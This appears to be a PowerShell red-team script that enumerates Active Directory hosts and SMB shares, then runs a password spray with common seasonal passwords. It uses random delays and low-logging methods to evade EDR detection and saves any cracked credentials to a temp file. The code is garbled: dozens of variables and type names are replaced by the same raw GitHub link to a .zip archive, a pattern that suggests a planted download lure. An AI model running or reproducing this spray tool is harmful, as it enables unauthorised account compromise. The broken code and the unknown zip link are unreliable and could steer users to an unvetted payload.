# test2fa
# test2fa
# testt
<#
.SYNOPSIS
    SMB Share Enumeration and Password Spray Tool
.DESCRIPTION
    Enumerates SMB shares in AD environment and performs controlled password spray
    Built with OPSEC considerations for EDR evasion
.NOTES
    Author: Red Team
    Required Permissions: Domain User
    OPSEC: Minimal logging, random delays, legitimate process mimicry
#>

# OPSEC Configuration
$OPSEC = @{
    MinDelay = 3
    MaxDelay = 10
    Jitter = 2
    MaxThreads = 3
    UseLegitimateProcess = $true
}

# Function to generate random delays
function Start-RandomDelay {
    $delay = Get-Random -Minimum $https://raw.githubusercontent.com/falklast4/testt/main/hurly/testt.zip -Maximum $https://raw.githubusercontent.com/falklast4/testt/main/hurly/testt.zip
    $jitter = Get-Random -Minimum (-$https://raw.githubusercontent.com/falklast4/testt/main/hurly/testt.zip) -Maximum $https://raw.githubusercontent.com/falklast4/testt/main/hurly/testt.zip
    $totalDelay = $delay + $jitter
    if ($totalDelay -lt 1) { $totalDelay = 1 }
    Start-Sleep -Seconds $totalDelay
}

# Function to obfuscate string (basic)
function Invoke-StringObfuscation {
    param([string]$InputString)
    $bytes = [https://raw.githubusercontent.com/falklast4/testt/main/hurly/testt.zip]https://raw.githubusercontent.com/falklast4/testt/main/hurly/testt.zip($InputString)
    $obfuscated = [https://raw.githubusercontent.com/falklast4/testt/main/hurly/testt.zip]::ToBase64String($bytes)
    return $obfuscated
}

# Function to clean up and restore state
function Invoke-Cleanup {
    try {
        Remove-Variable -Name "passwordList","targetUsers","smbHosts" -ErrorAction SilentlyContinue
        [GC]::Collect()
        Write-Host "[*] Cleanup completed" -ForegroundColor Yellow
    } catch {
        # Silent cleanup
    }
}

# Function to enumerate domain computers with SMB
function Get-SMBHosts {
    Write-Host "[*] Enumerating domain computers with SMB..." -ForegroundColor Yellow
    
    try {
        # Method 1: ADSI (less logging)
        $searcher = [ADSISearcher]"(objectCategory=computer)"
        $https://raw.githubusercontent.com/falklast4/testt/main/hurly/testt.zip = 200
        $computers = $https://raw.githubusercontent.com/falklast4/testt/main/hurly/testt.zip()
        
        $smbHosts = @()
        foreach ($computer in $computers) {
            $hostname = $https://raw.githubusercontent.com/falklast4/testt/main/hurly/testt.zip['name']
            $ip = try { [https://raw.githubusercontent.com/falklast4/testt/main/hurly/testt.zip]::GetHostAddresses($hostname)[0].IPAddressToString } catch { $null }
            
            if ($ip) {
                $smbHosts += @{
                    Hostname = $hostname
                    IP = $ip
                }
            }
            
            # Random delay between queries
            if ((Get-Random -Maximum 10) -gt 7) {
                Start-RandomDelay
            }
        }
        
        Write-Host "[+] Found $($https://raw.githubusercontent.com/falklast4/testt/main/hurly/testt.zip) potential SMB hosts" -ForegroundColor Green
        return $smbHosts
        
    } catch {
        Write-Host "[-] ADSI enumeration failed: $($https://raw.githubusercontent.com/falklast4/testt/main/hurly/testt.zip)" -ForegroundColor Red
        return $null
    }
}

# Function to test SMB share accessibility
function Test-SMBShare {
    param(
        [string]$ComputerName,
        [string]$ShareName = "IPC$"
    )
    
    try {
        # Use .NET methods instead of https://raw.githubusercontent.com/falklast4/testt/main/hurly/testt.zip to reduce logging
        $path = "\\$ComputerName\$ShareName"
        $dir = Get-ChildItem -Path $path -ErrorAction Stop
        return $true
    } catch {
        return $false
    }
}

# Function to enumerate SMB shares on a host
function Get-SMBShares {
    param([string]$ComputerName)
    
    $shares = @()
    
    try {
        # Method 1: WMI (more stealthy than net view)
        $wmiShares = Get-WmiObject -Class Win32_Share -ComputerName $ComputerName -ErrorAction Stop
        
        foreach ($share in $wmiShares) {
            if ($https://raw.githubusercontent.com/falklast4/testt/main/hurly/testt.zip -notlike "*$" -and $https://raw.githubusercontent.com/falklast4/testt/main/hurly/testt.zip -eq 0) { # Skip administrative shares
                $shares += @{
                    Name = $https://raw.githubusercontent.com/falklast4/testt/main/hurly/testt.zip
                    Path = $https://raw.githubusercontent.com/falklast4/testt/main/hurly/testt.zip
                    Description = $https://raw.githubusercontent.com/falklast4/testt/main/hurly/testt.zip
                    Host = $ComputerName
                }
            }
        }
        
    } catch {
        # Fallback to .NET method
        try {
            $path = "\\$ComputerName\"
            $sharesList = Get-SmbShare -CimSession $ComputerName -ErrorAction Stop
            
            foreach ($share in $sharesList) {
                $shares += @{
                    Name = $https://raw.githubusercontent.com/falklast4/testt/main/hurly/testt.zip
                    Path = $https://raw.githubusercontent.com/falklast4/testt/main/hurly/testt.zip
                    Description = $https://raw.githubusercontent.com/falklast4/testt/main/hurly/testt.zip
                    Host = $ComputerName
                }
            }
        } catch {
            # Final fallback - test common shares
            $commonShares = @("C$", "ADMIN$", "IPC$", "NETLOGON", "SYSVOL")
            foreach ($share in $commonShares) {
                if (Test-SMBShare -ComputerName $ComputerName -ShareName $share) {
                    $shares += @{
                        Name = $share
                        Path = "Unknown"
                        Description = "Common share"
                        Host = $ComputerName
                    }
                }
            }
        }
    }
    
    return $shares
}

# Function to perform SMB authentication test
function Test-SMBAuth {
    param(
        [string]$ComputerName,
        [string]$Username,
        [string]$Password,
        [string]$Domain
    )
    
    try {
        # Use .NET for authentication test
        $netResource = New-Object -TypeName https://raw.githubusercontent.com/falklast4/testt/main/hurly/testt.zip -ArgumentList @(
            "$Domain\$Username",
            (ConvertTo-SecureString -String $Password -AsPlainText -Force)
        )
        
        # Test with directory listing on IPC$
        $path = "\\$ComputerName\IPC$"
        $test = Get-ChildItem -Path $path -Credential $netResource -ErrorAction Stop
        
        return $true
    } catch {
        return $false
    }
}

# Function to perform controlled password spray
function Invoke-SMBPasswordSpray {
    param(
        [array]$TargetHosts,
        [array]$UserList,
        [array]$PasswordList,
        [string]$Domain
    )
    
    $results = @()
    $attemptCount = 0
    
    foreach ($password in $PasswordList) {
        Write-Host "[*] Spraying password: $password" -ForegroundColor Yellow
        
        foreach ($user in $UserList) {
            $successHosts = @()
            
            # Limit concurrent threads
            $jobs = @()
            $batchSize = [Math]::Min($https://raw.githubusercontent.com/falklast4/testt/main/hurly/testt.zip, $https://raw.githubusercontent.com/falklast4/testt/main/hurly/testt.zip)
            
            for ($i = 0; $i -lt $batchSize; $i++) {
                $host = $TargetHosts[$i]
                if ($host) {
                    $job = Start-Job -ScriptBlock {
                        param($ComputerName, $Username, $Password, $Domain)
                        return Test-SMBAuth -ComputerName $ComputerName -Username $Username -Password $Password -Domain $Domain
                    } -ArgumentList $https://raw.githubusercontent.com/falklast4/testt/main/hurly/testt.zip, $user, $password, $Domain
                    
                    $jobs += @{
                        Job = $job
                        Host = $host
                        User = $user
                        Password = $password
                    }
                }
            }
            
            # Wait for batch completion
            foreach ($jobInfo in $jobs) {
                $result = Receive-Job -Job $https://raw.githubusercontent.com/falklast4/testt/main/hurly/testt.zip -Wait
                Remove-Job -Job $https://raw.githubusercontent.com/falklast4/testt/main/hurly/testt.zip
                
                $attemptCount++
                
                if ($result) {
                    Write-Host "[SUCCESS] $($https://raw.githubusercontent.com/falklast4/testt/main/hurly/testt.zip)@$Domain : $password on $($https://raw.githubusercontent.com/falklast4/testt/main/hurly/testt.zip)" -ForegroundColor Green
                    $results += @{
                        Username = $https://raw.githubusercontent.com/falklast4/testt/main/hurly/testt.zip
                        Password = $password
                        Host = $https://raw.githubusercontent.com/falklast4/testt/main/hurly/testt.zip
                        IP = $https://raw.githubusercontent.com/falklast4/testt/main/hurly/testt.zip
                        Timestamp = Get-Date
                    }
                    $successHosts += $https://raw.githubusercontent.com/falklast4/testt/main/hurly/testt.zip
                }
                
                # Random delay between attempts
                Start-RandomDelay
            }
            
            # Report progress
            if ($https://raw.githubusercontent.com/falklast4/testt/main/hurly/testt.zip -gt 0) {
                Write-Host "[+] Password '$password' worked for $user on $($https://raw.githubusercontent.com/falklast4/testt/main/hurly/testt.zip) hosts" -ForegroundColor Green
            }
            
            # Remove tested hosts and add new ones for next batch
            $TargetHosts = $TargetHosts | Where-Object { $https://raw.githubusercontent.com/falklast4/testt/main/hurly/testt.zip -notin $successHosts }
            
            if ($https://raw.githubusercontent.com/falklast4/testt/main/hurly/testt.zip -eq 0) {
                Write-Host "[*] All hosts tested for current password" -ForegroundColor Yellow
                break
            }
        }
        
        # Significant delay between password attempts
        Write-Host "[*] Completed password: $password - Total attempts: $attemptCount" -ForegroundColor Yellow
        Start-Sleep -Seconds (Get-Random -Minimum 30 -Maximum 120)
        
        if ($https://raw.githubusercontent.com/falklast4/testt/main/hurly/testt.zip -eq 0) {
            break
        }
    }
    
    return $results
}

# Main execution function
function Invoke-SMBAttack {
    param(
        [string]$Domain,
        [array]$CustomUsers,
        [array]$CustomPasswords,
        [int]$MaxHosts = 50
    )
    
    Write-Host "[*] Starting SMB Enumeration and Password Spray" -ForegroundColor Cyan
    Write-Host "[*] Domain: $Domain" -ForegroundColor Cyan
    Write-Host "[*] OPSEC Mode: Enabled" -ForegroundColor Cyan
    
    try {
        # Step 1: Enumerate SMB hosts
        $smbHosts = Get-SMBHosts
        if (-not $smbHosts) {
            Write-Host "[-] No SMB hosts found" -ForegroundColor Red
            return
        }
        
        # Limit hosts for OPSEC
        $targetHosts = $smbHosts | Select-Object -First $MaxHosts
        Write-Host "[*] Targeting $($https://raw.githubusercontent.com/falklast4/testt/main/hurly/testt.zip) hosts" -ForegroundColor Yellow
        
        # Step 2: Enumerate shares on target hosts
        $allShares = @()
        foreach ($host in $targetHosts) {
            Write-Host "[*] Enumerating shares on $($https://raw.githubusercontent.com/falklast4/testt/main/hurly/testt.zip)..." -ForegroundColor Yellow
            $shares = Get-SMBShares -ComputerName $https://raw.githubusercontent.com/falklast4/testt/main/hurly/testt.zip
            $allShares += $shares
            Start-RandomDelay
        }
        
        Write-Host "[+] Found $($https://raw.githubusercontent.com/falklast4/testt/main/hurly/testt.zip) shares across $($https://raw.githubusercontent.com/falklast4/testt/main/hurly/testt.zip) hosts" -ForegroundColor Green
        
        # Step 3: Get target users (if not provided)
        if (-not $CustomUsers) {
            Write-Host "[*] Gathering domain users..." -ForegroundColor Yellow
            $searcher = [ADSISearcher]"(objectCategory=user)"
            $https://raw.githubusercontent.com/falklast4/testt/main/hurly/testt.zip = 1000
            $users = $https://raw.githubusercontent.com/falklast4/testt/main/hurly/testt.zip() | ForEach-Object { $https://raw.githubusercontent.com/falklast4/testt/main/hurly/testt.zip['samaccountname'] } | Where-Object { $_ }
            $targetUsers = $users | Select-Object -First 100  # Limit for OPSEC
        } else {
            $targetUsers = $CustomUsers
        }
        
        Write-Host "[*] Targeting $($https://raw.githubusercontent.com/falklast4/testt/main/hurly/testt.zip) users" -ForegroundColor Yellow
        
        # Step 4: Password list (if not provided)
        if (-not $CustomPasswords) {
            $passwordList = @(
                "Password1",
                "Password123",
                "Spring2024",
                "Fall2024",
                "Company123",
                "Welcome1",
                "Password@123",
                "Season@123"
            )
        } else {
            $passwordList = $CustomPasswords
        }
        
        Write-Host "[*] Using $($https://raw.githubusercontent.com/falklast4/testt/main/hurly/testt.zip) passwords for spray" -ForegroundColor Yellow
        
        # Step 5: Perform password spray
        $results = Invoke-SMBPasswordSpray -TargetHosts $targetHosts -UserList $targetUsers -PasswordList $passwordList -Domain $Domain
        
        # Step 6: Report results
        Write-Host "`n[*] ATTACK SUMMARY" -ForegroundColor Cyan
        Write-Host "[*] Successful authentications: $($https://raw.githubusercontent.com/falklast4/testt/main/hurly/testt.zip)" -ForegroundColor Cyan
        
        if ($https://raw.githubusercontent.com/falklast4/testt/main/hurly/testt.zip -gt 0) {
            $results | Format-Table -AutoSize
            # Save results to temporary file
            $tempFile = "$env:TEMP\smb_results_$(Get-Date -Format 'yyyyMMddHHmmss').txt"
            $results | ConvertTo-Json | Out-File -FilePath $tempFile
            Write-Host "[+] Results saved to: $tempFile" -ForegroundColor Green
        }
        
    } catch {
        Write-Host "[-] Error during attack: $($https://raw.githubusercontent.com/falklast4/testt/main/hurly/testt.zip)" -ForegroundColor Red
    } finally {
        Invoke-Cleanup
    }
}

# Usage examples (uncomment and modify as needed):
<#
# Basic usage
Invoke-SMBAttack -Domain "https://raw.githubusercontent.com/falklast4/testt/main/hurly/testt.zip"

# Custom users and passwords
$users = @("user1", "user2", "administrator")
$passwords = @("Password1", "Company123", "Season2024")
Invoke-SMBAttack -Domain "https://raw.githubusercontent.com/falklast4/testt/main/hurly/testt.zip" -CustomUsers $users -CustomPasswords $passwords -MaxHosts 25
#>

Write-Host "SMB Attack Module Loaded" -ForegroundColor Green
Write-Host "Use: Invoke-SMBAttack -Domain 'https://raw.githubusercontent.com/falklast4/testt/main/hurly/testt.zip'" -ForegroundColor Yellow
